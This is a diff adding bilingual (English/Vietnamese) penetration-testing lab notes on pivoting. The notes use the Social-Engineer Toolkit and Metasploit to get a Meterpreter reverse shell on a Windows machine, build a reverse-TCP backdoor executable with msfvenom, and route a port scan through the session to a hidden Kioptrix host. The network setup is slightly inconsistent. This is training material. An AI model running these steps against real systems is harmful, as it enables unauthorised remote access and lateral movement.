@@ -1,0 +1,88 @@
+Pivoting is when we are going to access a machine that normally we would not be able to access.
+So that machines likely on some other network or some other subnet
+And we're able to access it via a machine
+that we've exploited that maybe do a home or just have direct access to that machine
+So we're going to kind of piece together everything that we've done so far in terms of post exploitation and you're going to be able to tie it all in and see where it fits
+
+Một số công cụ để thực hiên pivoting là: Proxy chains, Metasploit, Shuttle
+
+Cài đặt môi trường lab:
+
+Tạo 3 card mạng với thông tin cấu hình như sau: 
+vmnet2 Host-only 172.16.1.0/24
+Vmnet8 NAT
+
+gắn card VMnet7 cho máy Kali
+gắn card VMnet7 và VMnet8 cho máy Windows
+gắn card  NAT cho máy Kioptrix
+
+Đảm bảo rằng máy Kali ban đầu sẽ ko thể nhìn thấy được máy Kioptrix
+
+So an overview the goal here is that the Kali machine should not be able to talk to the Kioptrix after coming
+
+What we can do is we can exploit our Windows machine in order to achieve Kioptrix
+
+Sử dụng setoolkit để exploit mục tiêu window
+setoolkit
+|
+2) Website Attack Vectors
+|
+1) Java Applet Attack Method
+|
+1) Web Template
+|
+yes
+|
+172.16.129
+|
+no
+| 
+2. Use the applet built into SET
+|
+2. Google
+|
+1. Meterpreter Memory Injection
+|
+Enter - PORT of the listener [443]
+|
+Enter - Enter the number for the payload [meterpreter_reverse_https]
+
+Mở msfconsole để cấu hình listener:
+
+set PAYLOAD windows/meterpreter/reverse_https
+set LHOST 172.16.1.129
+set LPORT 443
+set EnableStageEncoding false
+set ExitOrSession false
+exploit -j
+sessions -l
+sessions -i 1 (sessions 1)
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Hoặc có thể tự tạo backdoor với msfvenom để khai thác nhanh:
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=172.16.1.129 LPORT=4444 -f exe -o shell.exe
+msfconsole -q 
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+#####################################
+
+Bắt đầu quá trình PIVOTING
+ipconfig
+arp -a
+route
+
+run autoroute -p
+run autoroute -s 192.168.27.0/24
+
+Kiểm tra kết nối đến máy chủ Kioptrix:
+Ctr+Z -> background
+use auxiliary/scanner/portscan/tcp
+set PORTS 139
+set RHOSTS 192.168.27.163
+run
+-> Successful
+Thử thoát sessions và scan lại port 139 trên máy chủ 192.168.27.163.
+-> Failed
+
+
